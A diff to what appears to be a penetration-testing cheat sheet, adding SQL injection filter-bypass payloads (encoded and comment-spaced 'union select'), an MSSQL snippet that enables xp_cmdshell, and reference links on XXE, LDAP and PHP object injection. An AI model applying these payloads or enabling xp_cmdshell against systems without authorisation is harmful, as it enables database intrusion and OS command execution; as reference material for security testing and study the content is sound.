@@ -190,6 +190,14 @@ Database | owner FROM all_tables
 Table | table_name FROM all_tables 
 Columns | column_name FROM all_tab_columns
 
+> **SQL Injection Filter Bypass**
+
+UTF-16 URL encoding for select and union:
+%u0055Nion %u0053elect
+
+Spaces:
+union/**/select
+
 > **SQL Injection Union**
 
 1) Once you have identified SQL injection, use order by or UNION select to determine the number of columns:
@@ -257,6 +265,18 @@ SQL Server Reading:
 BULK INSERT
 {% endhighlight %}
 
+> **MSSQL Enable xp_cmdshell**
+
+{% highlight sql %}
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+
+{% endhighlight %}
+
+
+
 > **SQL Injection Cheat Sheets**
 
 * [websec](https://websec.ca/kb/sql_injection)
@@ -279,6 +299,25 @@ Online:
 
 * [PHP and Perl](http://pentestmonkey.net/category/tools/web-shells)
 * [Bash, PHP, Netcat, Telnet, Perl, Ruby, Java, Python, Gawk](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
+
+> **XXE**
+
+* [SANS XXE](https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities)
+* [OWASP XXE](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing)
+* [OWASP XML Cheat Sheet](https://www.owasp.org/index.php/XML_Security_Cheat_Sheet)
+* [Youtube XXE](https://www.youtube.com/watch?v=DJaX4HN2gwQ)
+* [Microsoft XML Entity](https://msdn.microsoft.com/en-us/library/ms256483(v=vs.110).aspx)
+* [w3schools XML DTD](https://www.w3schools.com/xml/xml_dtd.asp)
+
+> **LDAP Injection**
+
+* [SANS](https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap)
+* [OWASP](https://www.owasp.org/index.php/Testing_for_LDAP_Injection_(OTG-INPVAL-006))
+
+
+> **PHP Autoload and Object Injection**
+* [PHP Autoload](https://hakre.wordpress.com/2013/02/10/php-autoload-invalid-classname-injection/)
+* [PHP Autoload](https://prezi.com/5hif_vurb56p/php-object-injection-revisited/)
 
 > **Useful Resources**
 
